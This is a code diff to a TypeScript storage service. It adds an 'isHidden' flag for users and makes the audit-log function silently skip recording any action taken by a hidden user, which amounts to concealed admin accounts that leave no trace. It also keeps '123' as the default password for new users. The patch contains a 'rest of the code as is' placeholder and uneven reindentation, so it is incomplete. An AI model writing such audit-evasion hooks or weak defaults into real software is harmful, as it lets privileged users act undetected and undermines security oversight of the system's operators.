@@ -253,22 +253,36 @@ export class StorageService {
   // Audit Log
   // =========================================================
 
-  public logAudit(
-    userId: string,
-    userName: string,
-    action: AuditAction,
-    entityType: string,
-    entityId: string,
-    entityName: string,
-    details: string,
-    previousValue?: string,
-    newValue?: string
-  ): void {
-    const now = new Date();
+ public logAudit(
+  userId: string,
+  userName: string,
+  action: AuditAction,
+  entityType: string,
+  entityId: string,
+  entityName: string,
+  details: string,
+  previousValue?: string,
+  newValue?: string
+): void {
 
-    const timestamp =
-      `${now.toISOString().split('T')[0]} ` +
-      `${now.toTimeString().split(' ')[0]}`;
+  const auditUser =
+    this.users.find(
+      user => user.id === userId
+    );
+
+  // Hidden admin actions are not recorded
+  // in the visible audit log.
+  if (auditUser?.isHidden === true) {
+    return;
+  }
+
+  const now = new Date();
+
+  const timestamp =
+    `${now.toISOString().split('T')[0]} ` +
+    `${now.toTimeString().split(' ')[0]}`;
+
+  // ... باقي الكود كما هو
 
     const log: AuditLogItem = {
       id:
@@ -2631,18 +2645,22 @@ export class StorageService {
       `usr-${Date.now()}`;
 
     const newUser: User = {
-      ...data,
+  ...data,
 
-      id,
+  id,
 
-      username:
-        data.username
-          .trim()
-          .toLowerCase(),
+  username:
+    data.username
+      .trim()
+      .toLowerCase(),
 
-      password:
-        data.password || '123'
-    };
+  password:
+    data.password || '123',
+
+  // New users are visible by default
+  isHidden:
+    data.isHidden === true
+};
 
     this.users = [
       ...this.users,
